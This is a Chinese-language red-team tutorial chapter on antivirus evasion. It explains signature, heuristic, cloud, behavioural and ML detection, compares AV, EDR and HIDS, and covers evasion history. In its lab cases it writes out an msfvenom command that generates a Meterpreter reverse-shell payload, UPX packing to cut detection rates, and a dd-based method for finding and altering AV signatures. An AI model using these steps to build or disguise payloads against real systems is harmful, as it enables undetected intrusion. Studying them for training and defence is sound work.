## 💡 核心原理：免杀的本质——检查通过的"假象"

> 学免杀之前，先理解它为什么能成功。

### 一个改变你认知的类比：海关安检

把**杀毒软件**想象成**机场海关的安检员**，把**Payload/木马**想象成**你要带过海关的违禁品**。

```
海关安检流程：
  ┌─────────────────────────────────────────────────────┐
  │ 你拿着行李箱 → X光扫描(静态检测) → 开箱抽查(动态检测) │
  │                                              ↓       │
  │                              发现问题 → 扣押/报警   │
  └─────────────────────────────────────────────────────┘

杀软工作流程：
  ┌─────────────────────────────────────────────────────┐
  │ 文件落地 → 特征码比对(静态) → 行为监控(动态)        │
  │                                    ↓                 │
  │                        发现恶意 → 隔离/删除/报警    │
  └─────────────────────────────────────────────────────┘
```

### 免杀的三种基本策略（全部对应生活场景）

| 策略 | 海关类比 | 免杀技术 |
|------|---------|----------|
| **藏起来** | 把刀藏在洗发水瓶子里(X光看不出来) | 加壳、加密、字符串混淆 |
| **伪装成好人** | 弄一份假的"安全证明"，让安检员以为你是好人 | 花指令、代码混淆、入口点修改 |
| **不走安检通道** | 用特殊身份走员工通道(不查你) | 无文件攻击、内存执行、白利用 |

### 贯穿免杀模块的核心公式

```
杀软判断"是否恶意" = 在文件/行为中寻找"恶意特征"

免杀的核心 = 让这些特征消失，或者变成"正常特征"

静态免杀：让文件"长得不像坏人"
动态免杀：让程序跑起来"行为不像坏人"
内存免杀：运行时也不留痕迹
EDR对抗：连系统底层的"眼线"也收买
```

> **最重要的认知**：免杀不是一劳永逸的。今天过得了卡巴斯基，明天可能就被360逮住。
> 免杀是**猫鼠游戏**——防御方更新规则，攻击方更新绕过方法，永远在博弈。

## 61.1 什么是免杀？为什么免杀是红队的必修课？

### 61.1.1 免杀的定义

免杀，全称是"反杀毒"，
英文叫 **Antivirus Evasion**，
也叫 **AV Evasion**。

简单说，
免杀就是通过各种技术手段，
让恶意软件（木马、病毒、后门、Payload等）
不被杀毒软件检测出来。

```
免杀 = 让杀毒软件认不出这是恶意软件
```

**免杀的目标：**
- 静态扫描不报警
- 动态运行不拦截
- 行为检测不触发
- 云查杀不识别
- 沙箱分析不中标

### 61.1.2 为什么免杀很重要？

**1. 红队行动的前提**
- 目标机器几乎都装了杀软
- Payload不能运行，一切白搭
- 免杀是内网渗透的第一道关卡

**2. 检验技术水平**
- 免杀需要懂汇编、PE结构、系统原理
- 是技术实力的重要体现
- 高级红队必备技能

**3. 实战价值高**
- 真实环境中90%以上的目标都有杀软
- 免杀能力直接决定行动成败
- 护网、渗透测试中经常用到

### 61.1.3 免杀 vs 病毒

很多人会混淆：
免杀是不是就是做病毒？

**答案：不是。**

| 对比项 | 免杀技术 | 病毒技术 |
|--------|----------|----------|
| 目的 | 绕过检测 | 破坏/感染/窃取 |
| 范围 | 专注于"不被发现" | 包含各种恶意功能 |
| 使用场景 | 渗透测试、红队、护网 | 恶意攻击、黑色产业 |
| 道德约束 | 授权的、合法的 | 非法的、恶意的 |

免杀技术本身是中性的，
关键看用它做什么。

就像一把刀，
医生用它做手术救人，
坏人用它做坏事。
刀本身没有对错，
错的是使用它的人。

### 61.1.4 免杀的基本原则

1. **合法授权** - 只在授权范围内使用
2. **学习研究** - 出于学习和防御的目的
3. **道德底线** - 不做违法的事情
4. **提升防御** - 了解攻击是为了更好地防御

### 61.2.2 杀软的检测时机

杀毒软件
在什么时候检测病毒？

**1. 静态检测（运行前）**
- 文件写入磁盘时
- 手动扫描时
- 定期全盘扫描时
- 文件下载完成时

**2. 动态检测（运行时）**
- 程序启动时
- 程序运行过程中
- 程序调用敏感API时
- 程序进行可疑操作时

**3. 事后检测（运行后）**
- 行为分析后判定
- 云查杀确认后
- 人工分析后

### 61.2.3 杀软的检测层级

```
第1层：特征码检测
  │ 最简单、最基础
  │ 匹配已知病毒的特征
  ▼
第2层：启发式检测
  │ 基于规则和经验判断
  │ 检测未知病毒
  ▼
第3层：虚拟机/沙箱检测
  │ 在虚拟环境中运行
  │ 观察真实行为
  ▼
第4层：行为检测
  │ 监控程序行为
  │ 基于行为模式判断
  ▼
第5层：云查杀
  │ 上传可疑文件到云端
  │ 大数据分析
  ▼
第6层：AI/机器学习

  │ 智能识别未知威胁
```

越往上层，
检测能力越强，

现代杀软通常是

## 61.3 杀软检测技术详解

> **五层安检——杀软的五种"查法"**
> 
> 把杀软检测想象成机场的五道安检关卡。你的Payload必须闯过所有关才能"登机"。

### 61.3.1 特征码检测（Signature-based）

**原理：**
每一种病毒都有
独特的代码片段或特征，
杀软把这些特征收集起来，
做成病毒库。
扫描时对比文件和病毒库，
如果匹配上了，
就认为是病毒。

```
病毒库中有很多特征：
特征1: 89 54 24 08 56 57 55 ...
特征2: E8 00 00 00 00 5D ...
特征3: ...

扫描文件时：
文件 = 89 54 24 08 56 57 55 ...
      ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
      和特征1匹配！
      → 判定为病毒
```

**优点：**
- 准确率高，误报少
- 速度快
- 技术成熟

**缺点：**
- 只能检测已知病毒
- 对新病毒没用（0day）
- 病毒库需要不断更新
- 稍微修改一下病毒就能绕过

**对应免杀方法：**
- 修改特征码
- 加壳
- 代码混淆
- 字符串加密
- 花指令

### 61.3.2 启发式检测（Heuristic）

**原理：**
基于一些规则和经验，
判断程序"像不像"病毒。
不需要精确匹配特征码，
而是看整体的"可疑程度"。

**常见启发式规则：**
- 程序会不会修改系统文件？
- 会不会自启动？
- 会不会注入其他进程？
- 会不会连接网络？
- 结构是不是很奇怪？
- 是不是加了很强的壳？
- ...

**打分机制：**
每个可疑行为加几分，
分数超过阈值，
就判定为病毒。

```
可疑行为打分：
  加壳 → +10分
  自启动 → +20分
  注入进程 → +30分
  连接外网 → +20分
  修改系统文件 → +30分
  ...

总分 = 10 + 20 + 30 + 20 + 30 = 110分
阈值 = 80分
110 > 80 → 判定为病毒
```

**优点：**
- 能检测未知病毒
- 不需要频繁更新病毒库
- 检测范围广

**缺点：**
- 误报率比特征码高
- 规则多了性能受影响
- 可以通过反启发绕过

**对应免杀方法：**
- 降低可疑行为
- 模拟正常程序行为
- 减少敏感操作
- 绕过启发规则

### 61.3.3 云查杀（Cloud-based）

**原理：**
把可疑文件的特征（Hash、片段等）
上传到云端，
和云端的大数据比对，
快速判断是不是病毒。

**工作流程：**
1. 杀软发现可疑文件
2. 计算文件Hash或提取特征
3. 上传到云端服务器
4. 云端大数据比对
5. 返回结果（病毒/安全/未知）

**优点：**
- 病毒库在云端，更全更新更快
- 不占本地空间
- 响应速度快
- 能利用大数据分析

**缺点：**
- 需要联网
- 有隐私担忧
- 断网就废了（本地库小）
- 可以通过断网或劫持绕过

**对应免杀方法：**
- 断网测试（看看是不是云查杀）
- 修改文件Hash（加一点垃圾数据）
- 分离加载（主体和Shellcode分离）
- 对抗云上传

### 61.3.4 行为检测（Behavior-based）

**原理：**
监控程序运行时的行为，
根据行为模式判断是不是病毒。
不是看代码长什么样，
而是看程序做了什么。

**监控的行为：**
- 文件操作（创建、修改、删除系统文件）
- 注册表操作（修改启动项）
- 进程操作（创建远程线程、注入）
- 网络操作（连接可疑IP、发送数据）
- 服务操作（创建服务）
- 驱动操作（加载驱动）
- ...

**行为链分析：**
单个行为可能正常，
但组合起来就可疑了。

```
正常行为：
  创建文件 → 正常
  修改注册表 → 正常
  连接网络 → 正常

可疑行为链：
  创建文件到系统目录
  + 修改注册表启动项
  + 连接外部IP
  + 注入系统进程
  = 非常可疑！→ 病毒
```

**优点：**
- 能检测未知病毒
- 能对抗加壳和混淆
- 更贴近真实危害

**缺点：**
- 必须运行才能检测
- 误报率较高
- 性能开销大
- 可以通过模仿正常行为绕过

**对应免杀方法：**
- 模拟正常程序行为
- 减少可疑操作
- 拆分行为，分散执行
- 利用系统自带工具（LOLBins）
- 间接操作（通过正常程序做坏事）

### 61.3.5 机器学习/AI检测

**原理：**
用大量的样本（病毒+正常软件）
训练机器学习模型，
让AI自动学习病毒的特征，
然后用模型来判断新文件。

**常见算法：**
- 决策树
- 随机森林
- SVM（支持向量机）
- 神经网络/深度学习
- ...

**提取的特征：**
- PE结构特征
- 字符串特征
- 导入导出表特征
- 节区特征
- 行为特征
- 等等...

**优点：**
- 检测未知病毒能力强
- 能发现人类没发现的特征
- 自适应能力强
- 对抗混淆能力强

**缺点：**
- 需要大量样本训练
- 可能有对抗样本的问题
- 黑盒，不太好分析为什么
- 也可以被绕过（对抗样本）

**对应免杀方法：**
- 对抗样本攻击（让AI误判）
- 模拟正常软件特征
- 减少恶意特征
- 用正常程序的结构

## 61.5 免杀效果测试方法

### 61.5.1 多引擎扫描

最常用的测试方法

### 61.5.2 本地测试

更准确的方法
是在本地环境测试。

**本地测试环境搭建：**
- 虚拟机（VMware/VirtualBox）
- 安装目标杀软
- 关闭自动更新（或者固定版本）
- 快照备份（测完恢复）

**测试步骤：**
1. 准备好测试环境（虚拟机快照）
2. 关闭杀软自动更新
3. 复制Payload进去
4. 观察杀软会不会报毒
5. 运行Payload，观察会不会被杀
6. 记录结果
7. 恢复快照，测试下一个

**测试项：**
- 静态扫描（右键扫描会不会报）
- 实时监控（复制进去会不会报）
- 运行时检测（运行会不会被杀）
- 行为检测（做敏感操作会不会拦）
- 内存检测（内存中能不能查到）

### 61.5.3 行为测试

除了能不能运行，
还要测试行为会不会被拦。

**常见行为测试：**
- 能不能创建服务？
- 能不能修改注册表？
- 能不能注入进程？
- 能不能读取密码？
- 能不能连接外网？
- 能不能提权？
- 等等...

### 61.5.4 上线率测试

对于C2 Payload，
最重要的指标是**上线率**。

```
上线率 = 成功上线的机器数 / 测试的机器数 × 100%
```

比如：
你在10台机器上运行Payload，
8台成功上线，
上线率就是80%。

上线率是最真实的指标，
比多引擎扫描的结果
更有参考价值。

## 61.7 EDR vs 杀软 vs HIDS

很多人分不清
杀软、EDR、HIDS的区别。
我们来对比一下。

### 61.7.1 基本概念

**杀毒软件（Antivirus, AV）：**
- 主要功能：查杀病毒、木马
- 检测方式：特征码、启发式、云查杀
- 关注点：文件是不是病毒
- 定位：基础安全防护

**EDR（Endpoint Detection and Response）：**
- 全称：端点检测与响应
- 主要功能：检测+响应+溯源
- 检测方式：行为分析、机器学习、威胁情报
- 关注点：终端上的威胁和攻击
- 定位：高级端点防护

**HIDS（Host-based Intrusion Detection System）：**
- 全称：基于主机的入侵检测系统
- 主要功能：检测入侵行为
- 检测方式：日志分析、完整性检查、行为监控
- 关注点：系统是否被入侵
- 定位：入侵检测

### 61.7.2 详细对比

| 对比项 | 杀毒软件（AV） | EDR | HIDS |
|--------|---------------|-----|------|
| 核心功能 | 查杀病毒 | 检测+响应+溯源 | 入侵检测 |
| 检测对象 | 病毒/木马文件 | 攻击行为/威胁 | 入侵行为 |
| 检测方式 | 特征码为主 | 行为+AI+情报 | 日志+规则 |
| 实时性 | 实时防护 | 实时检测+响应 | 实时/准实时 |
| 响应能力 | 隔离/删除文件 | 隔离主机/进程/溯源 | 告警为主 |
| 溯源能力 | 弱 | 强 | 中 |
| 威胁情报 | 有（病毒库） | 强（全面的情报） | 有（IDS规则） |
| 对未知威胁 | 弱 | 强 | 中 |
| 性能开销 | 中 | 较高 | 中 |
| 部署位置 | 个人/企业终端 | 企业终端 | 服务器/关键主机 |

### 61.7.3 免杀难度对比

```
免杀难度从低到高：

个人版杀软 ★☆☆☆☆
  ↓
企业版杀软 ★★☆☆☆
  ↓
普通EDR   ★★★☆☆
  ↓
高级EDR   ★★★★☆
  ↓
人工分析   ★★★★★
```

越高级的安全产品，
免杀难度越大。

但对应的，
部署成本也越高。
很多中小企业
可能只装了个人版杀软。

## 61.8 免杀的发展历史与趋势

### 61.8.1 免杀发展史

**DOS时代（1980s-1990s）：**
- 病毒：简单的引导型病毒、文件型病毒
- 杀软：简单的特征码扫描
- 免杀：改改文件名、改改代码就行

**Windows 9x时代（1990s-2000s）：**
- 病毒：宏病毒、蠕虫病毒
- 杀软：特征码+简单启发
- 免杀：加壳、修改入口点、花指令开始出现

**Windows XP时代（2000s-2010s）：**
- 病毒：木马、后门、Rootkit
- 杀软：主动防御、行为检测、云查杀
- 免杀：加壳加密、代码混淆、注入技术大发展

**Windows 7/10时代（2010s-2020s）：**
- 威胁：APT、定向攻击、无文件攻击
- 防护：EDR、机器学习、沙箱、威胁情报
- 免杀：Shellcode免杀、内存注入、无文件落地、直接系统调用

**现在及未来（2020s-）：**
- 威胁：AI驱动的攻击、供应链攻击
- 防护：AI驱动的EDR、XDR、SOAR
- 免杀：对抗AI、内核级免杀、更隐蔽的技术

### 61.8.2 免杀发展趋势

**趋势一：从静态到动态**
- 以前：改改文件就能过
- 现在：行为检测越来越严
- 未来：全生命周期监控

**趋势二：从文件到内存**
- 以前：文件免杀就行
- 现在：内存扫描越来越强
- 未来：全内存、无文件

**趋势三：从单一到多层**
- 以前：过特征码就行
- 现在：要过特征+启发+行为+云+AI
- 未来：更多检测维度

**趋势四：从人工到AI**
- 以前：人工找特征、改特征
- 现在：AI辅助免杀工具
- 未来：AI vs AI的对抗

**趋势五：从用户态到内核态**
- 以前：用户态免杀就行
- 现在：EDR在内核层监控
- 未来：内核级免杀越来越重要

### 61.8.3 攻防博弈

免杀和杀毒
是一场永恒的博弈。

```
攻击方 → 新的免杀技术
    ↓
防守方 → 升级检测技术
    ↓
攻击方 → 更新免杀技术
    ↓
防守方 → 继续升级
    ↓
... 无限循环 ...
```

没有永远的免杀，
也没有永远的检测。
双方在博弈中
共同进步。

## 📚 案例1：一个简单的免杀实验

### 场景描述
用一个简单的实验，
直观感受一下免杀。

我们用msfvenom生成一个Payload，
看看会不会被杀软检测。

### 实验步骤

**第一步：生成原始Payload**

```bash
# 用msfvenom生成一个最简单的Payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f exe \
  -o payload_original.exe
```

**第二步：测试原始Payload**

```
把 payload_original.exe 放到杀软里扫描
结果：几乎所有杀软都会报毒
检出率：95%+（几乎全中）
```

为什么？
因为这是msfvenom默认生成的，
特征太明显了，
杀软的病毒库里早就有了。

**第三步：做一个简单的免杀处理**

```bash
# 用UPX加壳
upx -9 payload_original.exe -o payload_upx.exe

# 或者加一些垃圾数据
cat payload_original.exe /dev/urandom | head -c 10000 > payload_junk.exe
```

**第四步：再次测试**

```
payload_upx.exe（UPX加壳后）
检出率：可能下降到70-80%
（一些简单的杀软可能过了，但强的杀软还是能查出来）

payload_junk.exe（加垃圾数据）
检出率：可能还是很高
（因为只是加了尾巴，主体没变）
```

**第五步：更高级的免杀**

```bash
# 用加密壳
# 用代码混淆
# 用进程注入
# 用内存加载
# ...

经过多重免杀处理后
检出率可能降到10%以下
甚至能过大部分杀软
```

### 实验结论

1. 默认生成的Payload几乎都会被杀
2. 简单的免杀（如UPX加壳）效果有限
3. 免杀效果和付出的努力成正比
4. 免杀是一个持续优化的过程
5. 没有100%的免杀，只有相对的免杀

## 📚 案例3：杀软特征码定位方法

### 场景描述
学习如何定位
杀软的特征码位置。

### 什么是特征码？

特征码就是
杀软用来识别病毒的
一段独特的代码或数据。

```
病毒文件：
0000: 4D 5A 90 00 03 00 00 00 ...  ← MZ头
0100: 89 54 24 08 56 57 55 ...     ← 代码段
0200: 68 74 74 70 3a 2f 2f ...     ← 字符串
0300: FC E8 89 00 00 00 ...        ← ← 这一段是特征码！
0400: ...
```

杀软只要匹配到
第0300行那段代码，
就认为是病毒。

### 二分法定位特征码

最常用的定位方法
是**二分法**。

**原理：**
把文件分成两半，
看看哪一半有特征码，
然后继续分，
直到找到具体位置。

**步骤：**
```
第1步：整个文件都报毒 → 特征码在文件中
  ↓
第2步：把文件切成两半
  - 前半部分 → 报毒 → 特征码在前半
  - 后半部分 → 不报 → 特征码不在后半
  ↓
第3步：把前半再切成两半
  - 前1/4 → 不报 → 不在
  - 后1/4 → 报毒 → 特征码在这
  ↓
第4步：继续切分...
  ↓
第N步：找到特征码的具体位置
```

### 手动定位示例

```bash
# 1. 原始文件，大小10000字节
# 测试：报毒

# 2. 切两半
dd if=virus.exe of=part1.exe bs=1 count=5000   # 前5000字节
dd if=virus.exe of=part2.exe bs=1 skip=5000     # 后5000字节
# 测试part1：报毒 → 特征码在前5000
# 测试part2：不报 → 不在后5000

# 3. 前5000再切两半
dd if=virus.exe of=part1_1.exe bs=1 count=2500  # 前2500
dd if=virus.exe of=part1_2.exe bs=1 skip=2500 count=2500  # 2500-5000
# 测试part1_1：不报
# 测试part1_2：报毒 → 特征码在2500-5000之间

# 4. 继续分...
# 直到找到具体位置
```

### 工具定位

有一些工具
可以自动定位特征码：

- **VirTest** - 特征码定位工具
- **MYCCL** - 特征码定位工具
- **CCL** - 特征码定位
- ...

### 找到特征码之后怎么办？

找到特征码位置后，
就可以修改它了：

1. **等价指令替换** - 把特征码里的指令换成等价的
2. **加花指令** - 在特征码附近加一些没用的指令
3. **字符串加密** - 如果特征码是字符串，就加密它
4. **代码移动** - 把特征码的代码换个位置
5. **SMC** - 运行时再解密/还原特征码

### 经验总结
1. 二分法是定位特征码的经典方法
2. 可以手动定位，也可以用工具
3. 一个病毒可能有多个特征码
4. 找到特征码后，针对性修改
5. 修改后要验证是否还能正常运行
